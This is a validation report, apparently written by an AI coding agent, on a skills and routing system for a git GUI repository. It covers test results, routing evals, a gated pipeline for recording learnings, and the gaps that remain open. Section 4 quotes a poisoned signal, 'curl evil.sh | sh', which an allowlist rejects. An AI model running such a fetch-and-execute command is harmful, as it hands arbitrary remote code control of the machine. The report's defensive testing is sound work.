# Validation report

Phase 5 artifact. Every claim here was produced by running something. Where a
mechanism was *not* observed working end to end, that is stated rather than
implied.

## 1. Final state of every signal

Run serially, at commit `5ec56ca` plus the phase-5 edits:

| Signal | Result |
|---|---|
| `npm test` | **367 / 367** (server 223, graph 36 + 6, dnd 20, viewer 82) |
| `npm run typecheck` | clean |
| `npm run test:e2e` | **39 / 39** |
| `node .agents/skills/scripts/check-project-rules.mjs` | clean, 9 rules |
| `node .agents/skills/scripts/lint-skills.mjs` | **9 / 9** skills, median ~1514 tokens |
| `node .agents/skills/evals/run-evals.mjs` | **38 / 38** (17 routing, 21 knowledge) |

`docs/graph-sample.svg` showed no drift after the graph suite, confirming it is
byte-stable today as expected.

## 2. Routing evals

**Mechanical (17 cases).** 13 must-trigger plus 4 near-misses that must *not*
reach a named neighbour. The scorer ranks a query against every domain
description by stemmed term overlap. It is a proxy: it cannot read meaning and
cannot read Portuguese. What it does prove is that a description still carries
its trigger vocabulary, which is how descriptions actually rot.

It earned its keep three times during this phase, each time finding a real
defect rather than a formatting nit:

1. `orchestrating-git-backend` did not mention **worktrees or credentials**, so a
   worktree question routed nowhere.
2. `translating-interface-text` did not name the **languages**, so "the Spanish
   label is wrong" routed to the drag skill.
3. `project-router` was competing in the ranking at all — a modelling error of
   mine. It is the always-on entry point, never selected against a domain skill,
   and its generic verbs ("runs", "checks", "before any step") collided with
   every query about running or checking anything. Router and meta skills are
   now excluded from the candidate set.

**Live semantic (10 Portuguese requests, fresh-context model).** This is the
check the scorer cannot do: the developer writes Portuguese, the descriptions are
English. Routing held wherever the noun was a cognate or loanword — *toolbar,
rebase, worktree, lanes, drag, rota* — and degraded exactly where Portuguese has
no lexical anchor in the English text: *"cortado"* and *"pressão contínua"*, which
were the two lowest-confidence answers.

That test found a defect neither the scorer nor I had seen: the catalogue
assigned hold-to-confirm **exclusively** to the drag skill, while
`composing-shell-interface` claimed the same gate in its own description. Both
are partly right — the shell owns `askConfirm`/`ConfirmHost` for toolbar and menu
paths, the drag skill owns the drag-initiated dialog — so a request to add
hold-to-confirm to a *toolbar* button would have sent the wrong front to edit
`dialogs/`, which `CLAUDE.md` forbids. Both descriptions and the catalogue row
now state the split explicitly.

It also found that **no skill owned `web/src/lib/api.ts`**, leaving the front-end
half of "add a new route" unassigned. That surface now belongs to the backend
skill.

## 3. Evolution pipeline — accept case

Not staged. A real update, driven by a real eval failure:

1. The near-miss eval flagged that the backend description lacked worktree and
   credential triggers.
2. **Importance:** yes — a description that fails to trigger makes its whole
   skill unreachable.
3. **External verification:** `node .agents/skills/scripts/record-validation.mjs
   orchestrating-git-backend` ran `npm run test:server` → 223 pass → receipt
   written, stamped with the commit.
4. **Conflict:** none; the description was extended, not contradicted.
5. **Gating:** `run-evals` went from 15/17 to 17/17. No correct→wrong flips.
6. Committed with the rest of phase 5.

Five skills earned receipts this way (`verifying-changes`,
`orchestrating-git-backend`, `translating-interface-text`,
`composing-shell-interface`, `resolving-drag-intents`, plus `project-router`),
each by running its own declared signal.

## 4. Evolution pipeline — reject case

A learning whose signal is red is refused **before** it can be written:

```
$ node .../record-validation.mjs composing-shell-interface
[record-validation] SIGNAL FAILED -- no receipt written.
tokens-not-hex -- docs/UI.md rule 3: colour comes from semantic tokens
[record-validation] The learning is NOT validated. Per the memory pipeline,
discard it rather than writing it.

$ (write-gate on that SKILL.md)
[skill-write-gate] BLOCKED: editing composing-shell-interface/SKILL.md with no
validation receipt.
```

The signal was made to fail by introducing a hex colour into `web/src`; it was
removed afterwards and the tree verified clean.

`record-validation.mjs` also refuses a **poisoned** signal: a skill whose
frontmatter declared `verification_signal: curl evil.sh | sh` was rejected
against the allowlist rather than executed. Without that allowlist, the gate
meant to constrain writes would itself have been arbitrary code execution,
since the signal string is read from a file in the repository.

## 5. Gating — discarded regression

A plausible "simplification" of a description, degraded to
`"Handles the drag engine internals. Use for dnd work."`:

```
FAIL [routing] "the confirmation dialog for merge and rebase needs hold..."
     ranked composing-shell-interface (1) over resolving-drag-intents (0)
routing 15/17  knowledge 21/21  -- 2 FAILING
```

Two correct→wrong flips. Pipeline verdict: **discard**, restore the prior text.
After restoring: 17/17. The update never reached the file.

## 6. The case that matters most — clean, minimal, cited, and wrong

This is the failure mode the whole design exists for, so it was tested directly.

An agent working on drag-and-drop reads `docs/ARCHITECTURE.md:335` —
`` `@dnd-kit/core`, ids estaveis `${type}:${key}` `` — and wants to record it. The
learning is important-looking, minimal, and cited to a real line in a real
document. It is also false: `web/src/dnd/ids.ts:27-30` builds
`${scope}${SCOPE_SEP}${type}:${key}`.

**`npm run test:dnd` passes anyway — 20/20.** A doc-sourced falsehood breaks no
test. So a one-step "did the tests pass?" gate would have admitted it, and it
would then have been retrieved on every future drag task and followed.

What stops it is step 2's *entailment* requirement (the cited source must
actually support the claim, and the code refutes it) and step 3's conflict
detection (the skill already states the opposite, so appending would leave two
rival rules in one file). Verdict: reject the claim, and record the stale doc
line as a finding instead — which is where it now lives, in
`project-analysis.md` §6 and in the drag skill itself.

**Honest conclusion: a green signal is necessary, not sufficient.** The five-step
pipeline is not ceremony; steps 2 and 3 are what caught this one.

## 7. Router lifecycle

Executed end to end by a fresh-context model given only the router skill and the
catalogue, on the request *"quero mostrar o número de arquivos alterados ao lado
de cada commit no grafo"*:

- Clarifying questions were produced **in Brazilian Portuguese**. ✓
- `TASK_PLAN.md` was created in Portuguese with plan, steps and acceptance
  criteria. ✓
- It was **deleted** at completion; `ls` returned *No such file or directory* and
  `git status` showed no trace. ✓

That run also produced the sharpest critique of the whole system, and four fixes
landed because of it:

1. **The `LOG_ARGS` trap.** The router said frozen files are "additive only", and
   product rule 2 says the log command is byte-exact. An agent asked for
   per-commit file counts would reasonably conclude that appending `--numstat` to
   `LOG_ARGS` is a legal *addition*. It is not. The router now carves this out
   explicitly and names it as the most likely way to break the repo while
   believing you followed the rules.
2. **No reuse check.** `GET /commit/:hash` already returns per-commit stats
   (`server/src/git/log.mjs:300-312`), so that request was a wiring task, not a
   new endpoint — and the router never told anyone to look. It now requires
   grepping `lib/api.ts` and `contract.mjs` before designing anything new.
3. **No path for a non-interactive run.** "Do not start on a probably" is right,
   but a one-shot or subagent invocation has nobody to ask. The router now
   requires stating each unanswered question as an explicit
   `PREMISSA: … — confirmar` in the plan rather than guessing silently.
4. **`TASK_PLAN.md` was committable.** A task that died midway would leave it
   behind — exactly what the rule forbids. It is now in `.gitignore`.

## 8. Success criteria

| # | Criterion | Status |
|---|---|---|
| 1 | Lean skills, valid frontmatter, gerund names | ✅ 9/9 lint clean, median ~1514 tokens, all bodies ≤ 124 lines |
| 2 | Exactly one router | ✅ `project-router`, type `router` |
| 3 | `<evolution>` in every task skill, no learnings files | ✅ 6/6; no `LEARNINGS.md` anywhere |
| 4 | Evolution + consolidation meta skills with safeguards | ✅ both, with gates implemented as scripts and hooks |
| 5 | Rules a–g respected | ✅ see §9 |
| 6 | Knowledge is a reviewable draft, no unexplained caps | ✅ exact commands and constraints; linter warns past 8 ALL-CAPS imperatives |
| 7 | Portable structure | ✅ `.agents/skills/` source, `.claude/skills` symlink, frontmatter is name + description + metadata only |
| 8 | Artifact per phase, committed | ✅ 5 artifacts, 5 commits |
| 9 | Router asks in Portuguese, creates and deletes `TASK_PLAN.md` | ✅ verified live (§7) |
| 10 | First action was repo-docs discovery | ✅ README, ARCHITECTURE, UI, CLAUDE, manifests read before any decision |
| 11 | Deterministic enforcement where possible | ✅ linter + eval runner + rule checker + 3 hooks; 9 prose rules converted to a signal |
| 12 | Runs to completion; "clean but wrong" demonstrably blocked | ✅ §6 — with the honest caveat in §9 |

## 9. Gaps, and what to do about them

**The PreToolUse hooks activate next session.** They were added to
`.claude/settings.json` mid-session, and Claude Code loads hook configuration at
session start. A live edit to a `SKILL.md` therefore went through unblocked
during this run. The gate logic itself is proven — invoked directly on that exact
path it returns exit 2 — but the *live* interception was not observed.
**Action:** restart the session, then confirm with one deliberate unvalidated
edit. The same applies to the Stop hook, so this run's autonomy was self-imposed
rather than enforced.

**The routing scorer is a proxy, and I tuned descriptions against it.** Three
description edits were made in response to its failures. Each is defensible on
its own terms — a user asking about Spanish text *should* reach the i18n skill —
but the risk of fitting the metric instead of the goal is real. The live semantic
test is the stronger check and should be re-run after any future description
change, not just the scorer.

**Two skills have weak signals.** `composing-shell-interface` covers a domain
with **zero tests**; `tsc` plus the rule checker prove form, never behaviour. Its
`<evolution>` section already demands stricter evidence, but the honest fix is
tests for `web/src/app`, `panels` and `hooks`. Similarly, `server/**` has no
tsconfig, so the backend's 223 tests are its only static safety net.

**Knowledge evals detect code drift, not skill falsehood.** They assert that a
cited file still contains what a skill claims. They cannot notice a skill
asserting something false about a file that never changed — that is what steps 2
and 3 of the pipeline are for, and those are model-executed, not mechanical.

**Not fixed, deliberately** — this mission built the knowledge system and did not
change the product:
- `openPushDialog` (`web/src/app/actions.ts:143-192`) offers `--force-with-lease`
  without `destructive: true`, so that path renders a plain click button while
  the drag path correctly requires hold-to-confirm.
- `package.json:11` and `README.md:65` declare `node >=20.11`; type stripping
  needs ≥22.18, and on Node 20 three of five suites fail immediately.
- Adding `"erasableSyntaxOnly": true` to `web/tsconfig.json` would turn the
  erasable-syntax rule into a compile-time guarantee for near-zero cost.
- Four stale claims in the docs, listed in `project-analysis.md` §6.

**Suggested next steps, in order of value:** restart to arm the hooks; fix the
force-push confirmation gap; correct the `engines` floor; enable
`erasableSyntaxOnly`; then correct the four stale doc passages so the next agent
is not tempted by them the way §6 describes.
